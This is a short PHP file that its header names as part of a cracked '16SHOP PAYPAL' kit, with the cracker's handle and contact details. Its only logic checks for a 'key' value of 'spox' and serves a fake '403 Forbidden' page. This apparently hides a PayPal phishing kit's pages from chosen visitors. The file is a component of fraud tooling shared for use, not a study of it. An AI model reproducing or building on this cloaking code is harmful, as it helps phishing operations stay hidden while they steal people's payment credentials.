<?php

/**
 * 16SHOP PAYPAL CRACKED BY SPOX
 * icq & telegram = @spoxcoder
 
###############################################
#$            CRACKED by Spox_dz             $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 16SHOP            $#
###############################################

**/


if($_SESSION['key'] == "spox" or $_GET['key'] == "spox") {
  header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
